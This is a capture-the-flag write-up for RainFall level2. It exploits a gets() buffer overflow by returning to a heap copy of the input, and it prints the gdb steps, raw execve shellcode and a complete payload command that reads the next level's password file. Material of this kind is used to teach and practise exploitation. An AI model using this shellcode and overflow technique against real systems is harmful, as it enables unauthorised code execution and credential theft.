### Brief
This program contain a `main` function and a `p` function.
The `main` function only call `p` and return.
`p` function has a buffer of size `76` and use `gets` to fill it.

### Exploit
Same as in `level1` a buffer is filled using `gets` so it means we can use a buffer overflow.
But in this level the return address is checked before returning so we can't use any address.
To check the address the program use this mask: `0xb0000000` which correspond to the stack section addresses.
Although we can't use the stack program does a `strdup` of our buffer so we can use the heap.

```bash
level2@RainFall:~$ gdb level2
(gdb) break main
Breakpoint 1 at 0x8048542
(gdb) run
Starting program: /home/user/level2/level2 

Breakpoint 1, 0x08048542 in main ()
(gdb) info proc mappings
Mapped address spaces:
...
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

As there is no function that will make us win automatically we need to inject a shellcode in our payload.
The shellcode is just some assembly instruction that does an `execve` of `/bin/bash`.
Here is what it looks like: `'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'`.
So we need to put this in our payload and the return address will be the first instruction of our payload.

We use the same technique as in `level1` to get the offset of the return address which is `80`.
And we also get the address of our shellcode in the heap using gdb:

```bash
level2@RainFall:~$ gdb level2
(gdb) break *0x0804853d
Breakpoint 1 at 0x804853d
(gdb) run
Starting program: /home/user/level2/level2 
test
test

Breakpoint 1, 0x0804853d in p ()
(gdb) info register eax
eax            0x804a008	134520840
```
The address is `0x804a008`

### Get access
To craft our payload we first put our shellcode which `21` byte long.
The return address need to have an offset of `80` so we fill the payload with `80 - 21 = 59` bytes.
Then we write the return address in little endian in the payload: `'\x08\xa0\x04\x08'`

```bash
(python -c "print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A'*59 + '\x08\xa0\x04\x08')"; echo "cat /home/user/level3/.pass") | ./level2
```